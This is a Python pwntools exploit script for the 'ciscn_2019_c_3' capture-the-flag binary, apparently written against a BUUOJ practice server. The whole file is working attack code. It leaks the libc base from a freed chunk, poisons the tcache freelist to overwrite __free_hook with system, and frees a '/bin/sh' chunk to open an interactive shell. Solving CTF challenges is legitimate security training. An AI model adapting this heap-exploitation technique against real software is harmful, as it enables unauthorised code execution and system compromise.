import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ciscn_2019_c_3')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ciscn_2019_c_3')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
		else :
			io=remote('node3.buuoj.cn',27145)
			elf=ELF('./ciscn_2019_c_3')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')

		def add(a,b):
			io.sendlineafter('Command:','1')
			io.sendlineafter('size:',str(a))
			io.sendafter('Give me the name:',b)

		def show(a):
			io.sendlineafter('Command:','2')
			io.sendlineafter('index:',str(a))

		def delete(a):
			io.sendlineafter('Command:','3')
			io.sendlineafter('weapon:',str(a))

		def hack(a):
			io.sendlineafter('Command:','666')
			io.sendlineafter('weapon:',str(a))

		add(0x100,'\x00'*0xa0+'\n')
		add(0x4f,'/bin/sh\x00\n')
		add(0x4f,'/bin/sh\x00\n')
		add(0x60,'aaaa\n')
		for i in range(8) :
			delete(0)

		show(0)
		io.recvuntil('attack_times: ')
		libc_base=int(io.recvuntil('\n',drop=True))-libc.sym['__malloc_hook']-96-0x10
		libc.address=libc_base
		delete(2)
		delete(2)
		delete(3)
		for i in range(0x10) :
			hack(2)
		add(0x4f,'/bin/sh\x00\n')
		add(0x4f,'\x00'*0x38+p64(0x71)+p64(libc.sym['__free_hook']-0x10)+'\n')
		add(0x60,p64(libc.sym['system'])+'\n')
		delete(2)
		add(0x4f,'/bin/sh\x00\n')
		add(0x60,p64(libc.sym['system'])+'\n')
		delete(5)





		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue